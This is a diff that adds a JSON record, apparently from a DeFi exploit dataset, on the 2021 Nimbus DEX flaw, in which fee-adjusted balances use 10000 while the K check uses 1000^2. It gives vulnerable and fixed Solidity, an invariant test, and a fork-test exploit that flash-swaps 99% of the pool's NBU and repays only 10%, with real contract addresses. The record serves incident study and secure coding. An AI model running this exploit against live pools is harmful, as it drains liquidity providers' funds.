@@ -1,0 +1,34 @@
+{
+ "id": "2021__2021-09-21_Nimbus_KInvariant_1000vs10000",
+ "source_file": "2021/2021-09-21_Nimbus_KInvariant_1000vs10000.md",
+ "title": "Nimbus DEX — K Invariant Constant Mismatch (10000 vs 1000) Analysis",
+ "date": "2021-09-21",
+ "protocol": "Nimbus DEX",
+ "chain": "Ethereum",
+ "loss_raw": "~1.45 ETH (DeFiHackLabs README)",
+ "loss_usd": null,
+ "root_cause": "Identical to Uranium Finance — K invariant constant mismatch: reserves multiplied by 10000, but K validation uses 1000^2",
+ "attack_tx": "No confirmed on-chain attack tx — simulation PoC demonstrating K-invariant vulnerability; Nimbus pair contract had no swap activity at exploit date (fork block: 13,225,516)",
+ "vulnerable_contract": "0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62 (NWETH/NBU Pair)",
+ "classes": [
+  "slippage-amm"
+ ],
+ "code_before": [
+  "// ❌ Nimbus Pair @ 0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62\n// Uniswap V2 fork + fee constant changed but K validation not updated\n\nfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {\n    // ...\n    uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(fee)); // uses 10000\n    uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(fee)); // uses 10000\n\n    // ❌ K validation uses 1000^2 = 1,000,000 — should be 10000^2 = 100,000,000\n    // Actual K passes at a 100x lower threshold → allows 99% withdrawal\n    require(\n        balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2),\n        'Nimbus: K'\n    );\n}",
+  "// ❌ Root cause: same K invariant constant mismatch as Uranium Finance — reserves multiplied by 10000 but K validation uses 1000^2\n    function _safeTransfer(address token, address to, uint value) private {\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));  // ❌ external call — reentrancy possible\n        require(success && (data.length == 0 || abi.decode(data, (bool))), 'Nimbus: TRANSFER_FAILED');\n    }"
+ ],
+ "code_after": [
+  "// ✅ Fee constant and K validation constant aligned\nuint256 private constant FEE_DENOMINATOR = 10000;\n\nfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {\n    uint balance0Adjusted = balance0.mul(FEE_DENOMINATOR).sub(amount0In.mul(fee));\n    uint balance1Adjusted = balance1.mul(FEE_DENOMINATOR).sub(amount1In.mul(fee));\n\n    require(\n        balance0Adjusted.mul(balance1Adjusted) >=\n            uint(_reserve0).mul(_reserve1).mul(FEE_DENOMINATOR**2),\n        'Nimbus: K'\n    );\n}",
+  "// ✅ Unify fee constant + add K validation consistency tests\n// ✅ When forking, verify that all modified constants are reflected across every mathematical invariant\n\n// Invariant unit test\nfunction test_K_invariant_after_swap() public {\n    uint reserveIn = 1000e18;\n    uint reserveOut = 1000e18;\n    uint amountIn = 100e18;\n\n    uint balanceInAdj = (reserveIn + amountIn) * FEE_DENOMINATOR - amountIn * FEE;\n    uint amountOut = ...; // calculate\n\n    uint balanceOutAdj = (reserveOut - amountOut) * FEE_DENOMINATOR;\n\n    // This assertion must match the validation inside swap()\n    assert(balanceInAdj * balanceOutAdj >= reserveIn * reserveOut * FEE_DENOMINATOR**2);\n}"
+ ],
+ "steps": [
+  "Step 1: Calculate 99% of NBU balance",
+  "Step 2: IUniswapV2Pair(pair).swap(0, amount, this, data)",
+  "Step 3: Repay only 10% of withdrawn NBU to pair",
+  "Step 4: Attacker retains 90% of withdrawn NBU (profit)"
+ ],
+ "other_code": [
+  "┌──────────────────────────────────────────────────────────┐\n│ Step 1: Calculate 99% of NBU balance                     │\n│ amount = NBU.balanceOf(pair) * 99 / 100                  │\n│ NBU @ 0xEB58343b36C7528F23CAAe63a150240241310049         │\n└─────────────────────┬────────────────────────────────────┘\n                      │\n┌─────────────────────▼────────────────────────────────────┐\n│ Step 2: IUniswapV2Pair(pair).swap(0, amount, this, data) │\n│ pair @ 0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62       │\n│ Withdraw 99% NBU, execute fallback() callback            │\n└─────────────────────┬────────────────────────────────────┘\n                      │ fallback() callback\n┌─────────────────────▼────────────────────────────────────┐\n│ Step 3: Repay only 10% of withdrawn NBU to pair          │\n│",
+  "// testExploit() — mainnet fork block 13,225,516\nfunction testExploit() public {\n    console.log(\"Before exploiting\", IERC20(nbu).balanceOf(address(this)));\n\n    // Flash-swap 99% of pair's NBU\n    uint256 amount = IERC20(nbu).balanceOf(pair) * 99 / 100;\n    // pair = 0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62 (NWETH/NBU)\n    // nbu  = 0xEB58343b36C7528F23CAAe63a150240241310049\n\n    IUniswapV2Pair(pair).swap(0, amount, address(this), abi.encodePacked(amount));\n\n    console.log(\"After exploiting\", IERC20(nbu).balanceOf(address(this)));\n}\n\n// fallback() — repay only 10% to pass K validation\nfallback() external {\n    IERC20Custom(nbu).transfer(pair, IERC20(nbu).balanceOf(address(this)) / 10);\n    // 10% repaid → K = (balance*10000)^2 >= reserve^2 * 1000^2 passes\n    // Retain remaining 90%\n}"
+ ]
+}
